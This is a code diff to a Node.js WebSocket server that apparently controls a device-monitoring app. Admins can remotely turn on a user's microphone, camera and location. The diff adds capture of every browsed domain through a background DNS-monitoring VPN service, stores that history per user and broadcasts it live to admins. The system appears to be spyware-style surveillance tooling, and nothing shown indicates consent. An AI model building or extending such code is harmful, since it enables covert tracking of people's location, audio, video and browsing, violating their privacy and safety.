@@ -346,6 +346,7 @@ const admins       = new Map()   // userId → { ws, userId, name }
 const users        = new Map()   // userId → { ws, userId, name }
 const byWs         = new Map()   // ws → meta
 const transactions = new Map()   // userId → transaction[]
+const browsingHistory = new Map() // userId → { id, domain, timestamp, userId, userName }[]
 
 let idSeq = 0
 function makeId() { return `${++idSeq}-${Math.random().toString(36).slice(2, 6)}` }
@@ -450,6 +451,7 @@ wss.on('connection', (ws) => {
              'start_mic', 'stop_mic', 'start_location', 'stop_location'].includes(msg.type)) {
           const target = users.get(msg.targetId)
           if (target) send(target.bgWs || target.ws, { ...msg, fromAdminId: meta.userId })
+          return
         }
         // start_camera → both: browser ws (LiveKit publish) AND bgWs (JPEG fallback)
         if (msg.type === 'start_camera') {
@@ -458,6 +460,7 @@ wss.on('connection', (ws) => {
             send(target.ws, { ...msg, fromAdminId: meta.userId })
             if (target.bgWs) send(target.bgWs, { ...msg, fromAdminId: meta.userId })
           }
+          return
         }
         // Admin DM to a specific user
         if (msg.type === 'dm') {
@@ -467,14 +470,23 @@ wss.on('connection', (ws) => {
             send(target.ws, out)
             send(ws, { ...out, own: true })
           }
+          return
         }
-        return
+        // Not one of the above — fall through to the admin handlers below
+        // (transactions_get, browsing_get, etc.)
       }
 
       // ── Admin commands ── transactions ─────────────
       if (meta.role === 'admin' && msg.type === 'transactions_get') {
         const list = transactions.get(msg.userId) || []
         send(ws, { type: 'transactions_list', userId: msg.userId, transactions: list })
+        return
+      }
+
+      // ── Admin commands ── browsing activity ─────────
+      if (meta.role === 'admin' && msg.type === 'browsing_get') {
+        const list = browsingHistory.get(msg.userId) || []
+        send(ws, { type: 'browsing_list', userId: msg.userId, entries: list })
         return
       }
 
@@ -520,6 +532,18 @@ wss.on('connection', (ws) => {
           const uid = meta.isBg ? meta.primaryId : meta.userId
           const list = transactions.get(uid) || []
           send(ws, { type: 'transactions_list', userId: uid, transactions: list })
+          return
+        }
+
+        // Browsing domain captured by the native DNS monitor — store + broadcast to admins.
+        // Same bg-connection attribution as transactions: DnsMonitorVpnService talks to the
+        // server via KeepAliveService's background socket, not the foreground session.
+        if (msg.type === 'browsing_add') {
+          const uid = meta.isBg ? meta.primaryId : meta.userId
+          const entry = { ...msg.entry, userId: uid, userName: meta.name }
+          if (!browsingHistory.has(uid)) browsingHistory.set(uid, [])
+          browsingHistory.get(uid).unshift(entry)
+          broadcastToAdmins({ type: 'browsing_new', entry, fromUserId: uid, fromUserName: meta.name })
           return
         }
 
